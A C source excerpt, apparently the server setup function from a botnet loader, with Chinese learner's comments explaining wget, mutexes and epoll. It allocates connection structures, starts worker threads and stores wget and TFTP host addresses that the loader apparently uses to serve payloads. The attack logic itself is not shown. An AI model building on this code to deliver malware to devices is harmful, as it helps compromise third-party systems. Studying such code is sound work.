
struct server *server_create(uint8_t threads, uint8_t addr_len, ipv4_t *addrs, uint32_t max_open, char *wghip, port_t wghp, char *thip)
{
    // Create the Server
    // Calloc for the first bit
    struct server *srv = calloc(1, sizeof (struct server));
    struct server_worker *workers = calloc(threads, sizeof (struct server_worker));
    int i;

    // Fill out the structure
    // wget 非常稳定，它在带宽很窄的情况下和
    // 不稳定网络中有很强的适应性.如果是由于网络的
    // 原因下载失败，wget会不断的尝试，直到整个文件下载完毕
    // FTP和HTTP
    // 
    srv->bind_addrs_len = addr_len; // Default = 2
    srv->bind_addrs = addrs;        // 指针过去
    srv->max_open = max_open;       // 1024 * 64
    srv->wget_host_ip = wghip;      // 100.200.100.100
    srv->wget_host_port = wghp;     // 80
    srv->tftp_host_ip = thip;       // 100.200.100.100
    srv->estab_conns = calloc(max_open * 2, sizeof (struct connection *));

    // 申请了空间---对于 server_worker
    srv->workers = calloc(threads, sizeof (struct server_worker));
    srv->workers_len = threads;
    

    if (srv->estab_conns == NULL) //如果申请空间失败
    {
        printf("Failed to allocate establisted_connections array.\n");
        exit(0);
    }

    // Allocate locks internally--内部锁
    for (i = 0; i < max_open * 2; i++)
    {
        srv->estab_conns[i] = calloc(1, sizeof (struct connection));
        if (srv->estab_conns[i] == NULL) //每个部分申请一次内存空间
        {
            printf("Failed to allocate connection %d\n", i);
            exit(-1);
        }
        // int pthread_mutex_init(pthread_mutex_t *mutex, const pthread_mutexattr_t *attr);
        // ptread_mutex_t。通过对该结构的操作，来判断资源是否可以访问。顾名思义，
        // 加锁(lock)后，别人就无法打开，只有当锁没有关闭(unlock)的时候才能访问资源。
        // 将 struct connection 的 Lock定义为一个锁 pthread_mutex_t lock;
        pthread_mutex_init(&(srv->estab_conns[i]->lock), NULL); 
    }

    // Create worker threads
    for (i = 0; i < threads; i++) //有多少个处理器
    {
        struct server_worker *wrker = &srv->workers[i]; //定义的指针只想src->worker的地址

        wrker->srv = srv; //相互指定
        wrker->thread_id = i;

        // 创建一个epoll的事例，通知内核监听
        // TODO: 这个函数的使用过程依旧不是太过于清楚
        if ((wrker->efd = epoll_create1(0)) == -1)
        {
            printf("Failed to initialize epoll context. Error code %d\n", errno);
            free(srv->workers);
            free(srv);
            return NULL;
        }
        // worker --- 线程运行函数的起始地址
        // wrker --- 运行函数的参数
        pthread_create(&wrker->thread, NULL, worker, wrker);
    }

    // 如果不是多线程， 没有多核处理器，那么就只使用Server就好了
    pthread_create(&srv->to_thrd, NULL, timeout_thread, srv);

    return srv;
}